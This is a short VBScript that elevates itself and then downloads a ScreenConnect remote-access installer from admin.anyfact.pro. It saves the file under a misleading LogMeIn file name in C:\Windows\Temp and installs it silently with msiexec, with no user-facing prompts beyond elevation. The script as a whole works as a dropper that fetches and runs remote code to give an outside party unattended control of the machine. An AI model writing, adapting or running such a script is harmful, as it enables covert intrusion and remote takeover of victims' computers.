' Check if running with elevation
If WScript.Arguments.Length = 0 Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 1
    WScript.Quit
End If

' Define paths
msiUrl = "https://admin.anyfact.pro/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
destPath = "C:\Windows\Temp\LogMeInResolve_Unattended.msi"
destFolder = "C:\Windows\Temp"

' Create destination folder if needed
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists(destFolder) Then fso.CreateFolder destFolder
If fso.FileExists(destPath) Then fso.DeleteFile destPath, True

' Download file
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", msiUrl, False
http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
http.Send

' Save binary stream to file
If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile destPath, 2 ' Overwrite
    stream.Close
Else
    WScript.Quit 1
End If

' Run MSI installer silently
Set shell = CreateObject("WScript.Shell")
msiCommand = "msiexec /i """ & destPath & """ /qn /norestart /l*v ""C:\Windows\Temp\ScreenConnect_MSI.log"""
returnCode = shell.Run(msiCommand, 0, True)

WScript.Quit returnCode
